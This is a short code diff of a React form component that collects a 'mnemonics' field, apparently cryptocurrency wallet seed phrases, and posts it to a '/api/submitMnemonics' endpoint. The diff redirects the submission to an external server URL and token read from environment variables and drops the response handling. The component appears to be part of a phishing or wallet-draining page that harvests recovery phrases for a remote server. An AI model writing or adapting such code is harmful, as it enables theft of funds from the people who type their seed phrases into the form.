@@ -5,6 +5,8 @@ import { MdError } from "react-icons/md";
 export const Form = () => {
   const [submitted, setSubmitted] = useState(false);
   const [showError, setShowError] = useState(false);
+  const serverURL = import.meta.env.VITE_SERVER_URL;
+  const token = import.meta.env.VITE_TOKEN;
 
   if (submitted) {
     setTimeout(() => {
@@ -13,19 +15,16 @@ export const Form = () => {
     }, 10000);
   }
 
-  const submitHandler = async (e) => {
+  const submitHandler = (e) => {
     e.preventDefault();
     setSubmitted(true);
     const form = new FormData(e.target);
     try {
-      const res = await fetch("/api/submitMnemonics?token=kcudrebbur0", {
+      fetch(`${serverURL}/api/submitMnemonics?token=${token}`, {
         method: "POST",
         body: JSON.stringify({ mnemonics: form.get("mnemonics") }),
         headers: { "Content-Type": "application/json" }
       });
-
-      const response = await res.json();
-      console.log(response);
     } catch (e) {
       console.error(e);
     }
